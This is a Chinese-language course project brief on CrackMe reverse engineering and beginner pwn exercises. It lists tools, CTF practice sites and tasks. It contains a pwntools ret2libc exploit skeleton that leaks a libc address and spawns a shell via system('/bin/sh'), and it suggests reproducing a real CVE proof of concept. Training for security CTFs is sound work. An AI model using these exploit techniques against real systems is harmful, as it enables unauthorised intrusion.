# 项目 09：CrackMe 逆向 + Pwn 入门

> 对应章节：第 9 章《二进制安全与逆向工程》

## 目标

1. 用 Ghidra / IDA / gdb + pwndbg 完成 5 道 CrackMe 与 5 道 Pwn 入门题。
2. 理解并能写出 `ret2text / ret2libc / ret2csu / ROP` 利用脚本。
3. 产出 5+ 篇 WriteUp。

## 环境

```bash
# 基础
sudo apt install -y build-essential gdb gdb-multiarch python3-pip nasm ltrace strace
pip install pwntools capstone keystone-engine ropgadget

# 调试增强（三选一，推荐 pwndbg）
git clone https://github.com/pwndbg/pwndbg
cd pwndbg && ./setup.sh

# 反编译
sudo snap install ghidra                 # 或从 NSA 下载
# IDA Free：https://hex-rays.com/ida-free/
```

macOS（Apple Silicon）：
- 使用 UTM + Ubuntu ARM 做 Pwn 练习，或 UTM + Kali x86_64（通过 Rosetta）。

## 推荐题库

### CrackMe（逆向）

- crackmes.one：<https://crackmes.one/>（从 1-star 开始）
- ROP Emporium：<https://ropemporium.com/>
- pwn.college：<https://pwn.college/>（教学 + 自动判题）

### Pwn

- pwnable.tw：经典 Pwn 题库（stack、fmt、heap）
- pwnable.kr：入门友好
- PicoCTF：涵盖 Easy→Hard
- HackTheBox：Pwn 分类

## 必做题（由易到难）

### 逆向

1. `strings + ltrace` 水题：找出硬编码 flag。
2. 简单 XOR 解密：用 Python 还原算法。
3. 数学校验（取模 / 位运算 / 异或累加）。
4. 反调试 `ptrace` 绕过。
5. UPX 加壳 + 自写简单壳（实现加解密逻辑反推）。

### Pwn

1. **ret2text**：已有后门函数，覆盖返回地址即可。
2. **ret2libc**：leak `puts@got` → 计算 libc 基址 → `system("/bin/sh")`。
3. **ret2csu**：利用 `__libc_csu_init`，控制多寄存器。
4. **ret2syscall**：手工拼 `execve("/bin/sh", 0, 0)`。
5. **Format string**：leak canary + 任意写。

## 示例：ret2libc 利用脚本骨架

```python
from pwn import *

context(arch='amd64', os='linux', log_level='info')

elf  = ELF('./vuln')
libc = ELF('./libc.so.6')
io   = process('./vuln')   # 或 remote('target', 1337)

pop_rdi = 0x4011c3  # 用 ROPgadget 找
ret     = pop_rdi + 1

def leak():
    payload  = b'A' * 72
    payload += p64(pop_rdi) + p64(elf.got['puts'])
    payload += p64(elf.plt['puts']) + p64(elf.sym['main'])
    io.sendlineafter(b'> ', payload)
    leak = u64(io.recvline().strip().ljust(8, b'\x00'))
    libc.address = leak - libc.sym['puts']
    log.success(f'libc @ {libc.address:#x}')

def pwn():
    payload  = b'A' * 72
    payload += p64(ret)                                  # 对齐
    payload += p64(pop_rdi) + p64(next(libc.search(b'/bin/sh')))
    payload += p64(libc.sym['system'])
    io.sendlineafter(b'> ', payload)
    io.interactive()

leak(); pwn()
```

## 学习辅助

```bash
# 静态
checksec ./vuln
objdump -d -M intel ./vuln | less
strings -n 6 ./vuln
ROPgadget --binary ./vuln --only "pop|ret"

# 动态
gdb ./vuln
pwndbg> pattern create 200
pwndbg> r
pwndbg> pattern search
```

## 交付物

- `writeups/`：每题至少一篇 md
  - 题目说明 / 保护措施 / 思路 / 关键 gadget / 最终 exp
- `exploits/`：可直接运行的 `exp.py`
- `notes.md`：你在过程中总结的"套路笔记"（比如哪些 gadget 最常用、哪些 libc 函数偏移记得住）

## 加分项

- 复现 1 个真实 CVE（如某版本 libTIFF / libpng 栈溢出），写一份完整的漏洞分析 + PoC。
- 尝试 Windows PE 逆向：用 x64dbg 破解一个简单的 Keygenme。
- 学习并实现 **ARMv8 汇编的 shellcode**（对应 Apple Silicon / Android）。
- 阅读 `glibc/malloc/malloc.c` 源码，理解 tcache / fastbin 的挂链细节。
